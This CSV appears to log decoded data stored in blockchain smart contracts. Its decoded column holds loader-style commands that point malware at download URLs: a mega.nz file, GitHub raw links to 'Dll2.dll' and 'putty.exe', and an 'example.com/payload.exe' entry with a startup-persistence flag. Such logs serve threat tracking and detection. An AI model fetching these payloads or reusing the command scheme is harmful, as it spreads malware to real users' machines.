contract,contract_creator,timestamp,method,decoded,raw
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:21:11+00:00,hex,all:ping:url:htps://example.com/test.exe,616c6c3a70696e673a75726c3a687470733a2f2f6578616d706c652e636f6d2f746573742e657865
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:21:11+00:00,hex,all:url:https://mega.nz/file/j8wAiL5C#SaSUZoLwnhFxPNWaeInDx0x5Teh2lpGmSMpcdK-b_yI,616c6c3a75726c3a68747470733a2f2f6d6567612e6e7a2f66696c652f6a387741694c354323536153555a6f4c776e684678504e576165496e4478307835546568326c70476d534d7063644b2d625f7949
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:33:35+00:00,hex,all:url:https://mega.nz/file/j8wAiL5C#SaSUZoLwnhFxPNWaeInDx0x5Teh2lpGmSMpcdK-b_yI,616c6c3a75726c3a68747470733a2f2f6d6567612e6e7a2f66696c652f6a387741694c354323536153555a6f4c776e684678504e576165496e4478307835546568326c70476d534d7063644b2d625f7949
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:33:35+00:00,hex,all:url:https://mega.nz/file/j8wAiL5C#SaSUZoLwnhFxPNWaeInDx0x5Teh2lpGmSMpcdK-b_yI,616c6c3a75726c3a68747470733a2f2f6d6567612e6e7a2f66696c652f6a387741694c354323536153555a6f4c776e684678504e576165496e4478307835546568326c70476d534d7063644b2d625f7949
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:45:53+00:00,hex,all:url:https://github.com/lencod/lencod/raw/refs/heads/main/Dll2.dll,616c6c3a75726c3a68747470733a2f2f6769746875622e636f6d2f6c656e636f642f6c656e636f642f7261772f726566732f68656164732f6d61696e2f446c6c322e646c6c
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:45:53+00:00,hex,all:url:https://mega.nz/file/j8wAiL5C#SaSUZoLwnhFxPNWaeInDx0x5Teh2lpGmSMpcdK-b_yI,616c6c3a75726c3a68747470733a2f2f6d6567612e6e7a2f66696c652f6a387741694c354323536153555a6f4c776e684678504e576165496e4478307835546568326c70476d534d7063644b2d625f7949
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:54:57+00:00,hex,all:url:https://github.com/lencod/lencod/raw/refs/heads/main/Dll2.dll,616c6c3a75726c3a68747470733a2f2f6769746875622e636f6d2f6c656e636f642f6c656e636f642f7261772f726566732f68656164732f6d61696e2f446c6c322e646c6c
0x0138d33d8e468b19a7f7ea53604656823274ef42,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T11:54:57+00:00,hex,all:url:https://github.com/lencod/lencod/raw/refs/heads/main/Dll2.dll,616c6c3a75726c3a68747470733a2f2f6769746875622e636f6d2f6c656e636f642f6c656e636f642f7261772f726566732f68656164732f6d61696e2f446c6c322e646c6c
0x3d8dcabd9ca84dccc604ddc61564a723ebda2170,0xbe42e390c0701eff421e6d77ab89aa503831e8ac,2025-10-30T12:27:15+00:00,hex,all:url:https://github.com/lencod/lencod/raw/refs/heads/main/putty.exe,616c6c3a75726c3a68747470733a2f2f6769746875622e636f6d2f6c656e636f642f6c656e636f642f7261772f726566732f68656164732f6d61696e2f70757474792e657865
0x2d70bdfa1d3764085149ef02980f9ad6a81b7480,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T08:35:04+00:00,hex,all:ping:url:http://localhost:3001/,616c6c3a70696e673a75726c3a687474703a2f2f6c6f63616c686f73743a333030312f
0x2d70bdfa1d3764085149ef02980f9ad6a81b7480,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T08:35:04+00:00,plaintext,https://example.com/initial,https://example.com/initial
0x1b63b3dadd4a1c180e2fb04c1b798ae808a19d84,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T08:40:32+00:00,plaintext,https://example.com/initial,https://example.com/initial
0x1b63b3dadd4a1c180e2fb04c1b798ae808a19d84,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T08:40:32+00:00,hex+base64,jYn�Xm��?��_��݁��,616c6c3a75726c3a68747470733a2f2f7364666773666467646667
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:04:10+00:00,plaintext,https://example.com/initial,https://example.com/initial
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:04:10+00:00,hex+base64,jYn�Xm�����,616c6c3a75726c3a687474703a2f2f37363732
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:08:38+00:00,hex,all:url:all:url:http://7672,616c6c3a75726c3a616c6c3a75726c3a687474703a2f2f37363732
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:08:38+00:00,hex+base64,jYn�Xm�����,616c6c3a75726c3a687474703a2f2f37363732
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:09:18+00:00,hex,all:url:all:url:http://7672,616c6c3a75726c3a616c6c3a75726c3a687474703a2f2f37363732
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:09:18+00:00,hex+base64,jYn�Xm�����-,616c6c3a75726c3a687474703a2f2f74657374
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:10:24+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:10:24+00:00,hex+base64,jYn�Xm�����-,616c6c3a75726c3a687474703a2f2f74657374
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:14:50+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:14:50+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:16:54+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T10:16:54+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:16:30+00:00,hex,all:url:http://example.com/payload.exe,616c6c3a75726c3a687474703a2f2f6578616d706c652e636f6d2f7061796c6f61642e657865
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:16:30+00:00,hex,all:url:http://test11,616c6c3a75726c3a687474703a2f2f746573743131
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:20:04+00:00,hex,all:savestartupname:chrome:url:http://example.com/payload.exe,616c6c3a73617665737461727475706e616d653a6368726f6d653a75726c3a687474703a2f2f6578616d706c652e636f6d2f7061796c6f61642e657865
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:20:04+00:00,hex,all:url:http://example.com/payload.exe,616c6c3a75726c3a687474703a2f2f6578616d706c652e636f6d2f7061796c6f61642e657865
